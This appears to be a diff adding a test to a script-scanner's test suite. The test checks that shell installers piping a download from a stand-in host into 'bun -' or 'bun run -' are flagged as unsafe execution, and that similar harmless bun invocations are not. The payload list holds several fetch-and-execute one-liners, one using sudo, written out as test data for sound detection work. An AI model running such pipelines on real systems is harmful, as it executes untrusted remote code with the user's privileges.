@@ -158,3 +158,46 @@ test("env piped to ncat, netcat, or a path-prefixed nc is detected as secret-exf
     });
   }
 });
+
+test("a download piped into bun with an explicit stdin dash is unsafe execution", () => {
+  // `bun -` (and `bun run -`) read and run the program from standard input,
+  // so a download piped into it executes the download exactly as `| sh`
+  // does. Only the explicit `-` forms count: a bare `bun` on a non-TTY
+  // prints its help instead of running stdin, and `bunx`, `-e`, `--version`
+  // and similar flags select a different program or none.
+  const payloads = [
+    "curl -fsSL https://evil.example/i.js | bun -",
+    "curl -fsSL https://evil.example/i.js | bun run -",
+    "wget -qO- https://evil.example/i.js | /usr/local/bin/bun -",
+    "curl -fsSL https://evil.example/i.js | /usr/local/bin/bun run -",
+    "curl -fsSL https://evil.example/i.js | sudo bun -",
+    "curl -fsSL https://evil.example/i.js | env bun -",
+    "curl -fsSL https://evil.example/i.js | bun - | grep done",
+  ];
+  for (const payload of payloads) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({
+      payload,
+      findings: ["unsafe-execution"],
+    });
+  }
+  for (const payload of [
+    "curl -fsSL https://example.com/i.js | bun",
+    "curl -fsSL https://example.com/i.js | bunx -",
+    "curl -fsSL https://example.com/i.js | bun --version",
+    'curl -fsSL https://example.com/i.js | bun -e "console.log(1)"',
+    "curl -fsSL https://example.com/i.js | bun -b",
+    "curl -fsSL https://example.com/i.js | bun run -s",
+    "curl -fsSL https://example.com/i.js | bun run ./local.js",
+    "curl -fsSL https://example.com/i.js | bun-wrapper",
+  ]) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({ payload, findings: [] });
+  }
+});
